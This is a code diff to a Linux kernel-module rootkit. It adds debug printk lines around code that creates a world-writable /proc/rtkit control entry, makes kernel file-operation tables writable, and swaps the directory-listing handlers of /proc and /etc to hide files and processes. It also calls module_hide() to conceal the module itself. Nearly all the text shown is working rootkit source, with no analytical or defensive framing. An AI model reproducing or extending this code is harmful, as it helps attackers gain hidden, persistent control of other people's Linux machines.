@@ -217,10 +217,11 @@ static void fs_clean(void)
 static int __init procfs_init(void)
 {
 	struct file *proc_filp;
-
+	printk("in_rootkit_proc_init");
 	//new entry in proc root with 666 rights
 	proc_rtkit = proc_create("rtkit", 0666, NULL, &rtkit_fops);
 	if (proc_rtkit == NULL) return 0;
+	printk("rootkit_proc_init_rtkit_success");
 	//proc_root = proc_rtkit->parent;
 	//if (proc_root == NULL || strcmp(proc_root->name, "/proc") != 0) {
 	//	return 0;
@@ -228,6 +229,7 @@ static int __init procfs_init(void)
 
 	proc_filp = filp_open("/proc", O_RDONLY, 0);
 	if (proc_filp == NULL) return 0;
+	printk("rootkit_proc_init_proc_success");
 	//substitute proc readdir to our wersion (using page mode change)
 	proc_fops = ((struct file_operations *) proc_filp->f_op);
 	filp_close(proc_filp, NULL);
@@ -236,17 +238,18 @@ static int __init procfs_init(void)
 	set_addr_rw(proc_fops);
 	proc_fops->iterate = proc_readdir_new;
 	set_addr_ro(proc_fops);
-	
+	printk("rootkit_proc_init_success");
 	return 1;
 }
 
 static int __init fs_init(void)
 {
 	struct file *etc_filp;
-	
+	printk("in_rootkit_fs_init");	
 	//get file_operations of /etc
 	etc_filp = filp_open("/etc", O_RDONLY, 0);
 	if (etc_filp == NULL) return 0;
+	printk("rootkit_fs_init_etc_success");
 	fs_fops = (struct file_operations *) etc_filp->f_op;
 	filp_close(etc_filp, NULL);
 	
@@ -255,7 +258,7 @@ static int __init fs_init(void)
 	set_addr_rw(fs_fops);
 	fs_fops->iterate = fs_readdir_new;
 	set_addr_ro(fs_fops);
-	
+	printk("rootkit_fs_init_success");
 	return 1;
 }
 
@@ -265,10 +268,11 @@ static int __init rootkit_init(void)
 	if (!procfs_init() || !fs_init()) {
 		procfs_clean();
 		fs_clean();
+		printk("rootkit_init_fail");
 		return 1;
 	}
 	module_hide();
-	
+	printk("rootkit_init_success");	
 	return 0;
 }
 
